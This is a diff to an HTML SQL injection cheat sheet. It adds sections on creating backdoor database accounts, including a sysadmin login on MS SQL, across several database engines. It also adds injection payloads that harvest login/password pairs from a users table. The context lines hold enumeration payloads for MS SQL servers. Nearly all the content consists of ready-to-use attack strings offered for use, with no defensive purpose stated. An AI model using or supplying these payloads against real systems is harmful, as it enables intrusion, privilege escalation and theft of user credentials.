@@ -76,3 +76,36 @@ syscolumns, systypes where sysobjects.xtype = 'U' AND sysobjects.id = syscolumns
 <h2>Database Enumeration</h2>
 <p><i>' and 1 in (select min(name) from master.dbo.sysdatabases where name >'.' ) --</i> -> different databases in server</p>
 <p><i>' and 1 in (select min(filename) from master.dbo.sysdatabases where filename >'.' ) -- </i> -> file location of databases</p>
+
+<h1>Creating Database Accounts</h1>
+<h2>Microsoft SQL Server</h2>
+<p><ol>
+  <ul>exec sp_addlogin 'victor', 'Pass123'</ul>
+  <ul>exec sp_addsrvrolemember 'victor', 'sysadmin'</ul>
+</ol></p>
+<h2>Oracle</h2>
+<p><ol>
+  <ul>CREATE USER victor IDENTIFIED BY Pass123</ul>
+  <ul>TEMPORARY TABLESPACE temp</ul>
+  <ul>DEFAULT TABLESPACE users;/ul>
+    <ul>GRANT CONNECT TO victor;</ul>
+    <ul>GRANT RESOURCE TO victor;</ul>
+</ol></p>
+<h2>Microsoft Access</h2>
+<p><ol>
+  <ul>CREATE USER victor</ul>
+  <ul>IDENTIFIED BY 'Pass123'</ul>
+</ol></p>
+<h2>MySQL</h2>
+<p><ol>
+  <ul>INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))</ul>
+</ol></p>
+
+<h1>Password Grabbing</h1>
+<p>Password grabbing is one of the most serious consequences of an SQL injection attack.</p>
+<p><ol>
+  <ul>'; begin declare @var varchar(8000)</ul>
+  <ul>set @var=':' select @var=@var+' '+login+'/'+password+' '+ from users where login>@var select @var as var into temp end --</ul>
+  <ul>' and 1 in (select var from temp) --</ul>
+  <ul>' ;  drop table temp --</ul>
+</ol></p>
